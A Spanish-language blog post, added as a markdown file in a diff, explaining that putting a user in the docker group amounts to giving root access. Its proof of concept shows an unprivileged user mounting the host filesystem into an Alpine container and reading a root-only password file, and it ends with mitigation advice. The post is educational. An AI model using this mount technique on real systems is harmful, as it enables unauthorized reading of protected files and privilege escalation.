@@ -1,0 +1,110 @@
+---
+title: 'Docker puede ser un problema de seguridad en tu sistema'
+date: '2022-02-13'
+tags: ["Hacking", "Docker", "Vulnerabilities", "#Import 2022-12-20 21:06"]
+draft: false
+authors: ['default']
+summary: Docker nació o mejor dicho fue presentado al público en la PyCon de 2013 en una charla titulada 
+---
+
+Docker nació (o mejor dicho, fue presentado al público) en la PyCon de 2013 en una charla titulada *"The future of Linux Containers"*. Recomiendo ver el video que aparece a continuación (son menos de 6 minutos) y disfrutar del hecho de que en la informática, estamos viviendo lo que en un futuro será la "historia del desarrollo de software".
+
+Y es que los *Albert Einstein* del software como *[Linus Torvalds](https://es.wikipedia.org/wiki/Linus_Torvalds), [Robert C. Martin](https://es.wikipedia.org/wiki/Robert_C._Martin), [Martin Fowler](https://martinfowler.com/), [Guido Van Rossum](https://es.wikipedia.org/wiki/Guido_van_Rossum)* o muchos de los inventores de lenguajes de programación que se encuentran en el 99% del software que utilizamos, están vivos a día de hoy.
+
+Pero volviendo al tema de Docker. Docker no trajo consigo la tecnología de contenedores que se usa en Linux. Esto es algo que lleva existiendo desde [hace más de 20 años](https://blog.aquasec.com/a-brief-history-of-containers-from-1970s-chroot-to-docker-2016) con diferentes nombres como Chroot en 1979, Jails en el 2000 y contenedores a partir de 2004. Pero no fue hasta el 2013 cuando esta tecnología se empezó a utilizar por la mayoría de la gente.
+
+La verdadera ventaja que trajo Docker, fue la posibilidad de intercambiar imágenes de contenedores entre sistemas de una forma sencilla con los manifiestos Dockerfile y todo el ecosistema de alrededor. Pero no está libre de ser juzgado por mucha gente.
+
+**Uno de los problemas que se le achaca a Docker es que Docker Daemon se ejecuta como Root.** Y esto trae implicaciones indirectas como veremos a continuación.
+
+Cuando instalamos Docker siguiendo el tutorial su [página oficial](https://docs.docker.com/engine/install/ubuntu/), nos invita a seguir un proceso post-instalación en la [siguiente página](https://docs.docker.com/engine/install/linux-postinstall/) donde nos enseñan que **podemos ejecutar Docker sin permisos de root, metiendo a un usuario normal al grupo de Docker**. Y es que aquí está la clave del problema. Podemos llegar a pensar que ejecutar Docker con un usuario normal es más seguro, cuando eso no cambia nada y de hecho, te da una sensación de seguridad que puede resultarte caro como veremos en la prueba de concepto.
+
+Por romper una lanza a favor de ellos, en esa misma página podemos encontrar el cuadro a continuación.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-23.png)Y es que si, todos (o al menos yo alguna vez) solemos pasar por alto este tipo de mensajes si es que hemos llegado a verlos, porque en la mayoría de los blogs donde nos enseñan a instalar Docker en nuestro sistema directamente no nos previenen del riesgo de tener un usuario "sin privilegios" en el grupo de Docker. Además, "eso de Daemon Attack Surface a mi me suena a chino" 😎.
+
+Prueba de concepto
+==================
+
+1. Contexto del problema
+------------------------
+
+Tenemos 2 usuarios en nuestro sistema, **root** y **demo**.
+
+
+```
+──[root@parrot]─[/root]──# id
+uid=0(root) gid=0(root) grupos=0(root)
+```
+
+```
+──[demo@parrot]─[/home/demo]$ id
+uid=1001(demo) gid=1003(demo) grupos=1003(demo),1000(docker)
+```
+Como vemos, demo está en el grupo Docker para poder lanzar contenedores y realizar su gestión. Como demo es un usuario con pocos privilegios, además, es un poco con el que solemos hacer todo pensando que así estamos más seguros.
+
+2. El archivo "protegido" de root
+---------------------------------
+
+Hay un archivo en /home que se llama password.txt. Este archivo, en principio, tiene permisos 400 para que solo el usuario root pueda leer su contenido.
+
+
+```
+──[root@parrot]─[/home]──# ls -l
+total 4
+drwxr-xr-x 1 demo demo 204 Feb 13 21:00 demo
+-r-------- 1 root root  16 Feb 13 21:03 password.txt
+drwxr-xr-x 1 user user 614 Feb 13 19:53 user
+```
+![](https://blog.ikerocio.com/content/images/2022/02/image-24.png)Si no conoces como funcionan los permisos de Linux no pasa nada, simplemente créete la siguiente afirmación de lo que ocurre.
+
+**Ningún otro usuario, ni grupo del sistema, puede acceder al contenido del archivo password.txt con los permisos actuales.**
+
+Si aún así intentamos leer su contenido con el usuario demo, vemos el siguiente error.
+
+
+```
+──[demo@parrot]─[~/demo]───$ cat /home/password.txt 
+cat: /home/password.txt: Permiso denegado
+```
+Hasta aquí todo bien, ¿correcto?
+
+3. Docker Daemon Attack Surface
+-------------------------------
+
+A continuación, el usuario demo, el que no tenía privilegios, el que no podía leer el contenido de root, crea un contenedor del siguiente modo.
+
+
+```
+──[demo@parrot]─[~/demo]───$ docker run -v /:/vulnerable -it alpine /bin/sh
+Unable to find image 'alpine:latest' locally
+latest: Pulling from library/alpine
+59bf1c3509f3: Pull complete 
+Digest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300
+Status: Downloaded newer image for alpine:latest
+/ #
+```
+Y una vez, dentro del contenedor, empieza la magia 🧙‍♂️.
+
+
+```
+/ # whoami
+root
+/ # cat vulnerable/home/password.txt
+P0wn3dP@ssw0rd!
+```
+Es decir, un usuario sin privilegios, fuera del contexto de los contenedores no teníamos acceso a los archivos que root controlaba. 
+
+Dentro del contexto de los contenedores, si mapeamos en un volumen la raíz de todo el disco a una ruta del contenedor, tendremos control total de los archivos del sistema.
+
+4. Conclusión
+-------------
+
+¿Es el título del post clickbait? En parte sí. Más que una vulnerabilidad es un problema de no tener las cosas bien configuradas. 
+
+¿La página oficial de Docker podría explicar el problema o señalarlo de una mejor forma? Seguro que también.
+
+La realidad es que ellos no tienen la culpa. En su misma página explican todo esto. Y la realidad también es que poca gente es conocedora de este problema de "mala configuración". Es responsabilidad de todos hacer pedagogía y explicarles a nuestros compañeros los riesgos que acarrea según que cosas y yo, con este post, dejo mi granito de arena.
+
+¿Cómo deberías mitigar esto? Teniendo en mente que el usuario con el que gestionas Docker es como un usuario root. Protégelo con una buena contraseña y aíslalo del resto de cosas que haces en el sistema.
+
